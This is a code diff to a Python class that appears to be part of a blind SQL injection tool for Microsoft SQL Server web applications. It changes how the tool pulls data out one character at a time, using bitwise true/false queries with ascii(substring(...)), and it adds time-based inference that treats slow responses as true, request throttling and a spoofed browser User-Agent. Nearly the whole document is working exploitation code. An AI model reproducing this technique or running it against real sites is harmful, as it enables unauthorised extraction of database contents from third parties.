@@ -71,9 +71,9 @@ class MssqlTrueFalse:
 		self.output_dir = output_dir
 
 	def testInjection(self):
-		self.valide = self.doRequest()
+		self.valide = self.doRequest()['text']
 		if self.error=="":
-			valide2 = self.doRequest()
+			valide2 = self.doRequest()['text']
 			if self.valide != valide2:
 				print "Hard to deteremine the good page"
 				print "Try to add error option to help (option --Error)"
@@ -112,15 +112,19 @@ class MssqlTrueFalse:
 			z=0
 			q=Queue()
 			t=[]
+			# for j in range(8):
+			# 	if self.limit==1:
+			# 		t.append(Thread(target=self.bitGuessing, args=("ascii(substring((select top 1 " + colonne + " from (select top " + str(num) + " " + colonne + " from (" + request + ") aq order by " + colonne + " asc) dq order by " + colonne + " desc), " + str(i+1) + ", 1))",j,q)))
+			# 	else:
+			# 		t.append(Thread(target=self.bitGuessing, args=("ascii(substring((" + request + "), " + str(i+1) + ", 1))",j,q)))
+			# 	t[j].start()
 			for j in range(8):
+				# t[j].join()
 				if self.limit==1:
-					t.append(Thread(target=self.bitGuessing, args=("ascii(substring((select top 1 " + colonne + " from (select top " + str(num) + " " + colonne + " from (" + request + ") aq order by " + colonne + " asc) dq order by " + colonne + " desc), " + str(i+1) + ", 1))",j,q)))
+					z+=self.bitGuessing2("ascii(substring((select top 1 " + colonne + " from (select top " + str(num) + " " + colonne + " from (" + request + ") aq order by " + colonne + " asc) dq order by " + colonne + " desc), " + str(i+1) + ", 1))",j)
 				else:
-					t.append(Thread(target=self.bitGuessing, args=("ascii(substring((" + request + "), " + str(i+1) + ", 1))",j,q)))
-				t[j].start()
-			for j in range(8):
-				t[j].join()
-				z+=q.get()
+					z+=self.bitGuessing2("ascii(substring((" + request + "), " + str(i+1) + ", 1))",j)
+			# 	t[j].start()
 			val+=chr(z)
 			print val
 		return val
@@ -132,12 +136,20 @@ class MssqlTrueFalse:
 			return self.count("select len((" + request + "))",0,20)
 
 	def bitGuessing(self, request, bit, queue):
-		string = self.tricks("(cast(cast(" + request + " & " + str(pow(2,bit)) + " as bit) as CHAR(1))) = 1")
+		string = self.tricks("(cast(cast(" + request + " %26 " + str(pow(2,bit)) + " as bit) as CHAR(1))) = 1")
 		self.changeInject(string)
 		if self.testTrueFalse():
 			queue.put(1<<bit)
 		else:
 			queue.put(0)
+
+	def bitGuessing2(self, request, bit):
+		string = self.tricks("(cast(cast(" + request + " %26 " + str(pow(2,bit)) + " as bit) as CHAR(1))) = 1")
+		self.changeInject(string)
+		if self.testTrueFalse():
+			return (1<<bit)
+		else:
+			return (0)
 
 
 	def count(self, request, begin = 1, end = 100):
@@ -186,6 +198,13 @@ class MssqlTrueFalse:
 				return True
 			else:
 				return False
+		elif self.error == "time":
+			if self.verbose:
+				print res['time']+' seconds'
+			if res['time'] >= 4:
+				return True
+			else:
+				return False
 		else:
 			if re.search(self.error,res):
 				return False
@@ -193,6 +212,7 @@ class MssqlTrueFalse:
 				return True
 
 	def doRequest(self):
+		time.sleep(1)
 		if self.target == 1:
 			if re.search("W00T", self.inject):
 				url=re.sub("W00T","and 1=" + str(self.speChar) + "1",self.inject)
@@ -220,16 +240,17 @@ class MssqlTrueFalse:
 		request.add_header("User-Agent","Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) Gecko/20061010 Firefox/2.0")
 		request.add_header("Cookie",cookie.replace(" ", "%20"))
 		if post:
-			#request.add_data(post.replace(" ", "%20"))
 			request.add_data(post)
-		try:
-			page=urllib2.urlopen(request)
-			result = page.read()
-			if self.verbose:
-				print "Page length : %d"%len(result)
-		except:
-			result = "404"
-
+			#request.add_data(post)
+		a = time.time()
+		
+		page = urllib2.urlopen(request)
+		result = page.read()
+		if self.verbose:
+			print "Page length : %d"%len(result)
+		
+		b = time.time()
+		result = {'text': result, 'time': b-a}
 		self.stat+=1
 		return result
 
